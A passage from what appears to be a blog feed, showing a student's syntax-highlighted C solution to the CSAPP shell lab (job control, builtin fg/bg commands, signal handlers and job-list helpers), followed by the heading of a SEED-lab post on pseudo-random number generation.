class="hljs-number">0</span>)  <span class="hljs-comment">/* ignore blank line */</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/* should the job run in the background? */</span><br>    <span class="hljs-keyword">if</span> ((bg = (*argv[argc<span class="hljs-number">-1</span>] == <span class="hljs-string">&#x27;&amp;&#x27;</span>)) != <span class="hljs-number">0</span>) &#123;<br>    argv[--argc] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> bg;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * builtin_cmd - If the user has typed a built-in command then execute</span><br><span class="hljs-comment"> *    it immediately.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;quit&quot;</span>)) <span class="hljs-comment">/* quit command */</span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;&amp;&quot;</span>)) <span class="hljs-comment">/* Ignore singleton &amp; */</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <br>    <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>((argv[<span class="hljs-number">0</span>]),<span class="hljs-string">&quot;jobs&quot;</span>))<span class="hljs-comment">/* jobs command */</span><br>    &#123;<br>        listjobs(jobs);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>((argv[<span class="hljs-number">0</span>]),<span class="hljs-string">&quot;fg&quot;</span>) || !<span class="hljs-built_in">strcmp</span>((argv[<span class="hljs-number">0</span>]),<span class="hljs-string">&quot;bg&quot;</span>))<span class="hljs-comment">/* bg/fg command */</span><br>    &#123;<br>        do_bgfg(argv);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;     <span class="hljs-comment">/* not a builtin command */</span><br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * do_bgfg - Execute the builtin bg and fg commands</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!argv[<span class="hljs-number">1</span>])&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isdigit</span>(argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) &amp;&amp; argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;%&#x27;</span>) &#123;            <span class="hljs-comment">//checks if the second argument is valid</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span>* <span class="hljs-title">myjob</span>;</span><br>    <span class="hljs-keyword">if</span>(argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;%&#x27;</span>)&#123;<span class="hljs-comment">//jid</span><br>        myjob = getjobjid(jobs,atoi(&amp;argv[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]));<br>        <span class="hljs-keyword">if</span>(!myjob)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: No such job\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//pid</span><br>        myjob = getjobpid(jobs,atoi(argv[<span class="hljs-number">1</span>]));<br>        <span class="hljs-keyword">if</span> (!myjob) &#123;                                 <span class="hljs-comment">// Checks if the given PID is there</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such process\n&quot;</span>, atoi(argv[<span class="hljs-number">1</span>]));<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <br>    Kill(-myjob-&gt;pid,SIGCONT);<span class="hljs-comment">//send continue signal </span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;bg&quot;</span>))&#123;<br>        myjob-&gt;state = BG;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>,myjob-&gt;jid,myjob-&gt;pid,myjob-&gt;cmdline);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        myjob-&gt;state = FG;<br>        waitfg(myjob-&gt;pid);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * waitfg - Block until process pid is no longer the foreground process</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span>(fgpid(jobs))<br>        usleep(<span class="hljs-number">1000</span>);<span class="hljs-comment">//sleep one second</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*****************</span><br><span class="hljs-comment"> * Signal handlers</span><br><span class="hljs-comment"> *****************/</span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span><br><span class="hljs-comment"> *     a child job terminates (becomes a zombie), or stops because it</span><br><span class="hljs-comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span><br><span class="hljs-comment"> *     available zombie children, but doesn&#x27;t wait for any other</span><br><span class="hljs-comment"> *     currently running children to terminate.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> olderrno = errno;<br>    <span class="hljs-keyword">sigset_t</span> mask_all,prev;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    <span class="hljs-keyword">int</span> status;<br>    Sigfillset(&amp;mask_all);<br>    <span class="hljs-keyword">while</span>((pid = waitpid(<span class="hljs-number">-1</span>,&amp;status,WNOHANG | WUNTRACED))&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// WNOHANG | WUNTRACED return immediately</span><br>        <span class="hljs-keyword">if</span> (WIFEXITED(status))  <span class="hljs-comment">// normally exited,delete job</span><br>        &#123;<br>            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);<br>            deletejob(jobs, pid);<br>            sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSIGNALED(status))  <span class="hljs-comment">//terminated by signal, delete job and print message</span><br>        &#123;<br>            struct <span class="hljs-keyword">job_t</span>* job = getjobpid(jobs, pid);<br>            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WTERMSIG(status));<br>            deletejob(jobs, pid);<br>            sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>  <span class="hljs-comment">//stopped,change the status</span><br>        &#123;<br>            struct <span class="hljs-keyword">job_t</span>* job = getjobpid(jobs, pid);<br>            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WSTOPSIG(status));<br>            job-&gt;state= ST;<br>            sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-comment">//actually there is WIFCONTINUED,but we don&#x27;t care about</span><br>    &#125;<br>    errno = olderrno;  <br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span><br><span class="hljs-comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span><br><span class="hljs-comment"> *    to the foreground job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> olderrno = errno;<br>    <span class="hljs-keyword">pid_t</span> fg = fgpid(jobs);<br>    <span class="hljs-keyword">if</span>(fg)&#123;<br>        Kill(-fg,sig);<br>    &#125;<br>    errno = olderrno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span><br><span class="hljs-comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span><br><span class="hljs-comment"> *     foreground job by sending it a SIGTSTP.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> olderrno = errno;<br>    <span class="hljs-keyword">pid_t</span> fg = fgpid(jobs);<br>    <span class="hljs-keyword">if</span>(fg)&#123;<br>        Kill(-fg,sig);<br>    &#125;<br>    errno = olderrno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*********************</span><br><span class="hljs-comment"> * End signal handlers</span><br><span class="hljs-comment"> *********************/</span><br><br><span class="hljs-comment">/***********************************************</span><br><span class="hljs-comment"> * Helper routines that manipulate the job list</span><br><span class="hljs-comment"> **********************************************/</span><br><br><span class="hljs-comment">/* clearjob - Clear the entries in a job struct */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *job)</span> </span>&#123;<br>    job-&gt;pid = <span class="hljs-number">0</span>;<br>    job-&gt;jid = <span class="hljs-number">0</span>;<br>    job-&gt;state = UNDEF;<br>    job-&gt;cmdline[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* initjobs - Initialize the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    clearjob(&amp;jobs[i]);<br>&#125;<br><br><span class="hljs-comment">/* maxjid - Returns largest allocated job ID */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, max=<span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    <span class="hljs-keyword">if</span> (jobs[i].jid &gt; max)<br>        max = jobs[i].jid;<br>    <span class="hljs-keyword">return</span> max;<br>&#125;<br><br><span class="hljs-comment">/* addjob - Add a job to the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> state, <span class="hljs-keyword">char</span> *cmdline)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++) &#123;<br>    <span class="hljs-keyword">if</span> (jobs[i].pid == <span class="hljs-number">0</span>) &#123;<br>        jobs[i].pid = pid;<br>        jobs[i].state = state;<br>        jobs[i].jid = nextjid++;<br>        <span class="hljs-keyword">if</span> (nextjid &gt; MAXJOBS)<br>        nextjid = <span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">strcpy</span>(jobs[i].cmdline, cmdline);<br>          <span class="hljs-keyword">if</span>(verbose)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Added job [%d] %d %s\n&quot;</span>, jobs[i].jid, jobs[i].pid, jobs[i].cmdline);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tried to create too many jobs\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* deletejob - Delete a job whose PID=pid from the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deletejob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++) &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid) &#123;<br>            clearjob(&amp;jobs[i]);<br>            nextjid = maxjid(jobs)+<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* fgpid - Return PID of current foreground job, 0 if no such job */</span><br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">fgpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    <span class="hljs-keyword">if</span> (jobs[i].state == FG)<br>        <span class="hljs-keyword">return</span> jobs[i].pid;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* getjobpid  - Find a job (by PID) on the job list */</span><br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>        <span class="hljs-keyword">return</span> &amp;jobs[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">/* getjobjid  - Find a job (by JID) on the job list */</span><br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">int</span> jid)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (jid &lt; <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    <span class="hljs-keyword">if</span> (jobs[i].jid == jid)<br>        <span class="hljs-keyword">return</span> &amp;jobs[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">/* pid2jid - Map process ID to job ID */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pid2jid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    <span class="hljs-keyword">if</span> (jobs[i].pid == pid) &#123;<br>            <span class="hljs-keyword">return</span> jobs[i].jid;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* listjobs - Print the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++) &#123;<br>    <span class="hljs-keyword">if</span> (jobs[i].pid != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) &quot;</span>, jobs[i].jid, jobs[i].pid);<br>        <span class="hljs-keyword">switch</span> (jobs[i].state) &#123;<br>        <span class="hljs-keyword">case</span> BG: <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Running &quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> FG: <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Foreground &quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> ST: <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stopped &quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;listjobs: Internal error: job[%d].state=%d &quot;</span>, <br>               i, jobs[i].state);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, jobs[i].cmdline);<br>    &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/******************************</span><br><span class="hljs-comment"> * end job list helper routines</span><br><span class="hljs-comment"> ******************************/</span><br><br><br><span class="hljs-comment">/***********************</span><br><span class="hljs-comment"> * Other helper routines</span><br><span class="hljs-comment"> ***********************/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * usage - print a help message</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: shell [-hvp]\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -h   print this message\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -v   print additional diagnostic information\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -p   do not emit a command prompt\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * unix_error - unix-style error routine</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unix_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * app_error - application-style error routine</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">app_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Signal - wrapper for the sigaction function</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">handler_t</span> *<span class="hljs-title">Signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">handler_t</span> *handler)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">action</span>, <span class="hljs-title">old_action</span>;</span><br><br>    action.sa_handler = handler;  <br>    sigemptyset(&amp;action.sa_mask); <span class="hljs-comment">/* block sigs of type being handled */</span><br>    action.sa_flags = SA_RESTART; <span class="hljs-comment">/* restart syscalls if possible */</span><br><br>    <span class="hljs-keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="hljs-number">0</span>)<br>    unix_error(<span class="hljs-string">&quot;Signal error&quot;</span>);<br>    <span class="hljs-keyword">return</span> (old_action.sa_handler);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigquit_handler - The driver program can gracefully terminate the</span><br><span class="hljs-comment"> *    child shell by sending it a SIGQUIT signal.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigquit_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Terminating after receipt of SIGQUIT signal\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/******************************</span><br><span class="hljs-comment"> * my functions with error handling</span><br><span class="hljs-comment"> ******************************/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * fork error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">Fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid;<br><br>    <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Fork error&quot;</span>);<br>    <span class="hljs-keyword">return</span> pid;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * execve error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[], <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> environ[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (execve(filename, argv, environ) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * kill error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Kill</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> signum)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> kr;<br><br>    <span class="hljs-keyword">if</span> ((kr = kill(pid, signum)) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Kill error&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigemptyset error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigemptyset</span><span class="hljs-params">(<span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(sigemptyset(<span class="hljs-built_in">set</span>)&lt;<span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigemptyset error&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigaddset error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigaddset</span><span class="hljs-params">(<span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>,<span class="hljs-keyword">int</span> sign)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(sigaddset(<span class="hljs-built_in">set</span>,sign)&lt;<span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigaddset error&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigprocmask error handling</span><br><span class="hljs-comment"> */</span> <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigprocmask</span><span class="hljs-params">(<span class="hljs-keyword">int</span> how, <span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-keyword">sigset_t</span> *oldset)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(sigprocmask(how,<span class="hljs-built_in">set</span>,oldset)&lt;<span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigprocmask error&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigfillset error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigfillset</span><span class="hljs-params">(<span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(sigfillset(<span class="hljs-built_in">set</span>)&lt;<span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigfillset error&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * setpgid error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Setpgid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">pid_t</span> pgid)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rc;<br><br>    <span class="hljs-keyword">if</span> ((rc = setpgid(pid, pgid)) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Setpgid error&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Pseudo Random Number Generation Lab</title>
    <link href="/p/c8db7269/"/>
    <url>/p/c8db7269/</url>
    
